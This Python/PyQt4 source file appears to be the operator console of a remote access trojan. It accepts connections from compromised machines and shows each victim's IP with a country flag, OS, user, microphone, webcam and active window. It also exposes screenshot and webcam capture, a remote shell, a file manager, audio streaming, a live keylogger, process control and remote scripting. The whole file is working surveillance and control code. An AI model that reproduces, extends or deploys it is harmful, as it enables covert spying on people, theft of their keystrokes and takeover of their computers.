# -*- coding: utf-8 -*-

import sys
import socket
import os
import time
import ast
import zlib
import threading
import hashlib
import string
import random
import datetime
from threading import Thread

import Image
import ImageQt
from PyQt4.QtGui import *
from PyQt4.QtCore import *

from libs import pygeoip
from ui import gui
from libs.settings import Config, Settings
from libs.modechat import get, send
from plugins.maudio import main as maudio
from plugins.mexplorer import main as mexplorer
from plugins.mshell import main as mshell
from plugins.mkeylogger import main as mkeylogger
from plugins.mprocesses import main as mprocesses
from plugins.mscript import main as mscript


# initial geo ip database
geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')

# initial assets directories
assets = os.path.join(os.getcwd(), 'assets\\')
flags = os.path.join(assets, 'flags')


def get_ip_location(ip):
    country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
    if os.path.exists(country_flag):
        return country_flag
    else:
        return os.path.join(flags, 'blank.png')


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def os_icon(os_type):
    if os_type == "linux" or os_type == "linux2":
        return 'linux.png'
    elif os_type == "darwin":
        return 'mac.png'
    elif os_type == "win32":
        return 'windows.png'


class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        self.settings = Config()

        # set settings
        self.update_settings()

        # update gui
        self.gui = QApplication.processEvents

        self.portLabel.setText(str(self.PORT))

        # unlocked servers bank
        self.unlockedSockets = []

        # listen status
        self.acceptthreadState = False

        # plugins bank
        self.pluginsBank = {}
        self.current_sock = ''

        # disable panel buttons
        self.remoteShellButton.setDisabled(True)
        self.remoteExplorerButton.setDisabled(True)
        self.remoteAudioButton.setDisabled(True)
        self.remoteKeyloggerButton.setDisabled(True)
        self.remoteProcessesButton.setDisabled(True)
        self.remoteScriptingButton.setDisabled(True)
        self.lockServerButton.setDisabled(True)
        self.lockServerButton.setVisible(False)
        self.quitServerButton.setDisabled(True)
        self.unlockServerButton.setDisabled(True)
        self.updatePreviewButton.setDisabled(True)
        self.getWebcamButton.setDisabled(True)

        # indexes for servers table
        self.index_of_ipAddress = 0
        self.index_of_socket = 1
        self.index_of_lock = 2
        self.index_of_os = 3
        self.index_of_user = 4
        self.index_of_microphone = 5
        self.index_of_webcamera = 6
        self.index_of_activeWindowTitle = 7
        # initialize servers table columns width
        self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
        self.serversTable.setColumnWidth(self.index_of_socket, 50)
        self.serversTable.setColumnWidth(self.index_of_lock, 90)
        self.serversTable.setColumnWidth(self.index_of_os, 90)
        self.serversTable.setColumnWidth(self.index_of_user, 90)
        self.serversTable.setColumnWidth(self.index_of_microphone, 50)
        self.serversTable.setColumnWidth(self.index_of_webcamera, 50)
        # servers table double click trigger
        self.serversTable.doubleClicked.connect(self.unlock_server)
        # Initializing right click menu
        self.serversTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
                     self.server_right_click_menu)

        # Triggers
        self.startListenButton.clicked.connect(self.listen_start)
        self.stopListenButton.clicked.connect(self.listen_stop)
        self.clientSettingsButton.clicked.connect(self.run_settings)
        self.serversTable.clicked.connect(self.update_preview)

        # Panel Triggers
        self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
        self.getWebcamButton.clicked.connect(self.get_webcam_preview)
        self.unlockServerButton.clicked.connect(self.unlock_server)
        self.lockServerButton.clicked.connect(self.lock_server)
        self.quitServerButton.clicked.connect(self.lock_server)
        self.remoteShellButton.clicked.connect(lambda: self.run_plugin('shellMode'))
        self.remoteExplorerButton.clicked.connect(lambda: self.run_plugin('explorerMode'))
        self.remoteAudioButton.clicked.connect(lambda: self.run_plugin('audioMode'))
        self.remoteKeyloggerButton.clicked.connect(lambda: self.run_plugin('keyloggerMode'))
        self.remoteScriptingButton.clicked.connect(lambda: self.run_plugin('scriptingMode'))
        self.remoteProcessesButton.clicked.connect(lambda: self.run_plugin('processesMode'))

        # menu triggers
        self.actionStartListen_for_connections.triggered.connect(self.listen_start)
        self.actionStopListen_for_connections.triggered.connect(self.listen_stop)
        self.actionClient_Configuration.triggered.connect(self.run_settings)

        # Custom signal for update server table
        self.connect(self, SIGNAL('updateTable()'), self.update_servers_table)
        self.connect(self, SIGNAL('updatePanel()'), self.update_main_menu)
        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
        self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_plugin(plugin='scripting'))
        self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))

    # Start Listen for Servers
    def listen_start(self):
        # update settings
        self.update_settings()
        self.portLabel.setText(str(self.PORT))

        # Initializing variables
        if not self.acceptthreadState:
            self.socks = {}
            self.streaming_socks = {}
            self.acceptthreadState = True
            self.listenthread = Thread(target=self.accept_connections)
            self.listenthread.setDaemon(True)
            self.listenthread.start()
            self.statusLabel.setText('Online')
            self.statusLabel.setStyleSheet('color: lime; border: none; font: 8pt "MS Shell Dlg 2";')
            self.startListenButton.setChecked(True)
            self.stopListenButton.setChecked(False)
        else:
            self.startListenButton.setChecked(True)

    # Stop Listen for Servers
    def listen_stop(self):
        if self.acceptthreadState:
            self.acceptthreadState = False
            self.serversTable.clearContents()
            self.startListenButton.setChecked(False)
            self.stopListenButton.setChecked(True)
            self.statusLabel.setText('Offline')
            self.statusLabel.setStyleSheet('color: #e74c3c; border: none; font: 8pt "MS Shell Dlg 2";')
            self.onlineStatus.setText('0')
            try:
                self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shd.connect(('127.0.0.1', self.PORT))
                self.shd.close()
            except:
                pass
        else:
            self.stopListenButton.setChecked(True)

        self.update_main_menu()

    # listen for clients
    # accept connections
    def accept_connections(self):

        # Initializing socket
        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # telling the OS that you know what you're doing and you still want to bind to the same port
        self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind address
        self.c.bind((self.IPADDRESS, self.PORT))

        # Start listen for connections
        self.c.listen(self.MAXCONNECTIONS)

        # Start Servers Check Thread
        servers_check_start = threading.Thread(target=self.check_servers)
        servers_check_start.setDaemon(True)
        servers_check_start.start()

        while self.acceptthreadState:
            try:

                # Try accept connection
                self.sock, self.address = self.c.accept()
            except:
                continue

            if not self.acceptthreadState:
                return
            if self.sock:

                data = get(self.sock, 'myinfo', 'status')

                if data == 'parent':

                    data = get(self.sock, 'info', 'pcinfo')
                    info = ast.literal_eval(data)

                    # Set timeout None
                    self.sock.settimeout(self.TIMEOUT)

                    # Save connected socket
                    socket_index = self.address[1]
                    self.socks[socket_index] = {}
                    self.socks[socket_index]['sock'] = self.sock
                    self.socks[socket_index]['ip_address'] = self.address[0]
                    self.socks[socket_index]['socket'] = self.address[1]
                    self.socks[socket_index]['ostype'] = info['ostype']
                    self.socks[socket_index]['protection'] = info['protection']
                    self.socks[socket_index]['os'] = info['os']
                    self.socks[socket_index]['user'] = info['user']
                    self.socks[socket_index]['inputdevice'] = info['inputdevice']
                    self.socks[socket_index]['webcamdevice'] = info['webcamdevice']
                    self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']

                    get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')

                else:
                    mode, index = data.split(' ')
                    try:
                        if int(index) in self.socks:
                            i = int(index)

                            if mode == 'streamingMode':
                                data = get(self.sock, 'pcinfo', 'info')
                                info = ast.literal_eval(data)

                                self.streaming_socks[i] = {}
                                self.streaming_socks[i]['sock'] = self.sock
                                self.streaming_socks[i]['protection'] = info['protection']
                                self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                                self.emit(SIGNAL('updateTable()'))

                            self.send_run_signal(self.sock, mode)

                    except ValueError:
                        pass

    # Servers Live Update
    def check_servers(self):
        while self.acceptthreadState:
            try:
                for i, k in self.streaming_socks.iteritems():
                    sock = self.streaming_socks[i]['sock']
                    try:
                        data = get(sock, 'pcinfo', mode='pcinfo')
                        info = ast.literal_eval(data)
                        self.streaming_socks[i]['protection'] = info['protection']
                        self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                    except (socket.error, SyntaxError):
                        del self.socks[i]
                        del self.streaming_socks[i]
                        break
                    except zlib.error:
                        pass
            except (RuntimeError, ValueError):
                pass

            self.emit(SIGNAL('updateTable()'))
            self.emit(SIGNAL('updatePanel()'))

            time.sleep(1)

    def get_desktop_preview(self):
        server = self.current_server()
        if server:
            screen_dict = get(self.socks[server]['sock'], 'getScreen', 'screenshot')
            try:
                screen_info = ast.literal_eval(screen_dict)
                im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
                                      zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
                screen_bits = im.convert('RGBA')
                self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(screen_bits)).scaled(
                        self.previewLabel.size(), Qt.KeepAspectRatio))
            except SyntaxError:
                pass

    def get_webcam_preview(self):
        server = self.current_server()
        if server:
            webcam_dict = get(self.socks[server]['sock'], 'getWebcam', 'webcamera')
            try:
                webcam_info = ast.literal_eval(webcam_dict)
                im = Image.fromstring('RGB', (int(webcam_info['width']), int(webcam_info['height'])),
                                      zlib.decompress(webcam_info['webcambits']), 'raw', 'BGR', 0, -1)
                webcam_bits = im.convert('RGBA')
                self.webcamLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(webcam_bits)).scaled(
                    self.webcamLabel.size(), Qt.KeepAspectRatio))
            except SyntaxError:
                pass

    # Update Servers Table from self.socks
    def update_servers_table(self):
        self.serversTable.setRowCount(len(self.streaming_socks))
        try:
            for index, obj in enumerate(self.streaming_socks):

                # add ip address & county flag
                ip_address = self.socks[obj]['ip_address']
                item = QTableWidgetItem(ip_address)
                item.setIcon(QIcon(get_ip_location(ip_address)))
                self.serversTable.setItem(index, self.index_of_ipAddress, item)

                # add socket number
                item = QTableWidgetItem(str(self.socks[obj]['socket']))
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.serversTable.setItem(index, self.index_of_socket, item)

                # add server lock status
                lock_status = 'LOCKED' if self.streaming_socks[obj]['protection'] == 'False' else 'UNLOCKED'
                item = QTableWidgetItem(lock_status)
                if lock_status == 'LOCKED':
                    item.setTextColor(QColor('#e67e22'))
                    item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                else:
                    item.setTextColor(QColor('#2ecc71'))
                    item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                self.serversTable.setItem(index, self.index_of_lock, item)

                # add os version
                item = QTableWidgetItem(self.socks[obj]['os'])
                item.setIcon(QIcon(os.path.join(assets, os_icon(self.socks[obj]['ostype']))))
                self.serversTable.setItem(index, self.index_of_os, item)

                # add server user
                item = QTableWidgetItem(self.socks[obj]['user'])
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.serversTable.setItem(index, self.index_of_user, item)

                # add input device
                item = QTableWidgetItem()
                if self.socks[obj]['inputdevice'] == 'NoDevice':
                    item.setText('No')
                    item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                else:
                    item.setText('Yes')
                    item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
                self.serversTable.setItem(index, self.index_of_microphone, item)

                # add webcam device
                item = QTableWidgetItem()
                if self.socks[obj]['webcamdevice'] == 'NoDevice':
                    item.setText('No')
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                else:
                    item.setText('Yes')
                    item.setIcon(QIcon(os.path.join(assets, 'web_camera.png')))
                self.serversTable.setItem(index, self.index_of_webcamera, item)

                # add active windows title
                item = QTableWidgetItem(self.streaming_socks[obj]['activewindowtitle'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(QColor('#1abc9c'))
                self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
        except RuntimeError:
            pass

        # update servers online counter
        self.onlineStatus.setText(str(len(self.socks)))

    def unlock_server(self):
        while 1:
            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
                server = self.current_server()
                if server:
                    text, ok = QInputDialog.getText(self, 'Unlock Server', 'Enter Password: ', QLineEdit.Password)
                    if ok:
                        _hash = hashlib.md5()
                        _hash.update(str(text))

                        answer = get(self.socks[server]['sock'], _hash.hexdigest(), 'password')
                        if 'iamactive' in answer:
                            break
                    else:
                        break
            else:
                break

    def lock_server(self):
        server = self.current_server()
        if server:
            send(self.socks[server]['sock'], 'lock')

    def update_preview(self):
        server = self.current_server()
        if server:
            self.webcamNameButton.setText(self.socks[server]['webcamdevice'])

    def update_main_menu(self):
        try:
            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
                self.unlockServerButton.setVisible(True)
                self.unlockServerButton.setDisabled(False)
                self.updatePreviewButton.setDisabled(False)
                server = self.current_server()
                if self.socks[server]['webcamdevice'] != 'NoDevice':
                    self.getWebcamButton.setDisabled(False)

                self.remoteExplorerButton.setDisabled(True)
                self.remoteShellButton.setDisabled(True)
                self.remoteAudioButton.setDisabled(True)
                self.remoteKeyloggerButton.setDisabled(True)
                self.remoteScriptingButton.setDisabled(True)
                self.remoteProcessesButton.setDisabled(True)
                self.lockServerButton.setVisible(False)
                self.lockServerButton.setDisabled(True)
                self.quitServerButton.setDisabled(True)
            else:
                self.remoteExplorerButton.setDisabled(False)
                self.remoteShellButton.setDisabled(False)
                if self.has_microphone():
                    self.remoteAudioButton.setDisabled(False)
                self.remoteKeyloggerButton.setDisabled(False)
                self.remoteScriptingButton.setDisabled(False)
                self.remoteProcessesButton.setDisabled(False)
                self.lockServerButton.setVisible(True)
                self.lockServerButton.setDisabled(False)
                self.quitServerButton.setDisabled(False)
                self.unlockServerButton.setVisible(False)
                self.unlockServerButton.setDisabled(True)
                self.updatePreviewButton.setDisabled(False)
                server = self.current_server()
                if self.socks[server]['webcamdevice'] != 'NoDevice':
                    self.getWebcamButton.setDisabled(False)
        except:
            self.remoteExplorerButton.setDisabled(True)
            self.remoteShellButton.setDisabled(True)
            self.remoteAudioButton.setDisabled(True)
            self.remoteKeyloggerButton.setDisabled(True)
            self.remoteScriptingButton.setDisabled(True)
            self.remoteProcessesButton.setDisabled(True)
            self.lockServerButton.setVisible(False)
            self.lockServerButton.setDisabled(True)
            self.quitServerButton.setDisabled(True)
            self.unlockServerButton.setVisible(True)
            self.unlockServerButton.setDisabled(True)
            self.updatePreviewButton.setDisabled(True)
            self.getWebcamButton.setDisabled(True)

    def has_microphone(self):
        try:
            if str(self.serversTable.item(self.serversTable.currentRow(), self.index_of_microphone).text()) == 'Yes':
                return True
            else:
                return False
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No Server Selected', QMessageBox.Ok)
            warn.exec_()
            return False

    def server_right_click_menu(self, point):
        server_index = self.serversTable.currentRow()
        server_menu = QMenu(self)
        server_options_menu = QMenu('Server Options', self)
        server_options_menu.setIcon(QIcon(os.path.join(assets, 'settings.png')))

        if self.serversTable.selectedItems():
            if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)

            else:
                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell',
                                      lambda: self.run_plugin('shellMode'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
                                      lambda: self.run_plugin('explorerMode'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
                                      lambda: self.run_plugin('processesMode'))
                audio_menu = server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
                                          lambda: self.run_plugin('audioMode'))
                if not self.has_microphone():
                    audio_menu.setEnabled(False)
                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), 'Remote Scripting',
                                      lambda: self.run_plugin('scriptingMode'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
                                      lambda: self.run_plugin('keyloggerMode'))

                server_menu.addSeparator()
                server_menu.addMenu(server_options_menu)
                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
                                              self.lock_server)
                server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
                                              self.lock_server)
            server_menu.exec_(self.serversTable.mapToGlobal(point))

    # get item
    def current_server(self):
        try:
            return int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
        except AttributeError:
            return False

    def send_run_signal(self, sock, signal):
        signals = {
            'shellMode': 'executeShell()',
            'explorerMode': 'executeExplorer()',
            'audioMode': 'executeAudio()',
            'keyloggerMode': 'executeKeylogger()',
            'scriptingMode': 'executeScripting()',
            'processesMode': 'executeProcesses()',
        }
        if signal in signals:
            self.current_sock = sock
            self.emit(SIGNAL(signals[signal]))

    def execute_plugin(self, plugin):
        plugins = {
            'shell': mshell,
            'explorer': mexplorer,
            'audio': maudio,
            'keylogger': mkeylogger,
            'scripting': mscript,
            'processes': mprocesses,
        }

        server = self.current_server()
        if server:
            args = {
                'sock': self.current_sock,
                'socket': self.socks[server]['socket'],
                'ipAddress': self.socks[server]['ip_address'],
                'assets': assets,
            }
            plugin_id = id_generator()
            if plugin in plugins:
                self.pluginsBank[plugin_id] = plugins[plugin].mainPopup(args)
                self.pluginsBank[plugin_id].show()

    def run_plugin(self, mode):
        server = self.current_server()
        if server:
            get(self.socks[server]['sock'], 'startChildSocket %s' % server, mode)

    def update_settings(self):
        self.settings = Config()
        self.IPADDRESS = self.settings.ip_address
        self.PORT = self.settings.port
        self.MAXCONNECTIONS = self.settings.max_connections
        self.TIMEOUT = self.settings.timeout

    def run_settings(self):
        self.settings_form = Settings()
        self.settings_form.show()

    def closeEvent(self, event):
        sys.exit(1)

def handle_exception(exc_type, exc_value, exc_traceback):
    if form:
        now = datetime.datetime.now()
        filename = exc_traceback.tb_frame
        log_value = '''
DATE: %s/%s/%s %s:%s:%s
    FILE: %s
    LINE: %s
    ####################################
    # Exception Type: %s
    # Exception Value: %s
    # Exception Object: %s
    ####################################
        ''' % (now.year,
               now.month,
               now.day,
               now.hour,
               now.minute,
               now.second,
               filename.f_code.co_filename,
               exc_traceback.tb_lineno,
               exc_type,
               exc_value,
               exc_traceback)
        with open('error.log', 'a') as log_file:
            log_file.write(log_value)

open('error.log', 'w').close()
sys.excepthook = handle_exception

# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)
    form = MainDialog()

    form.show()

    sys.exit(app.exec_())
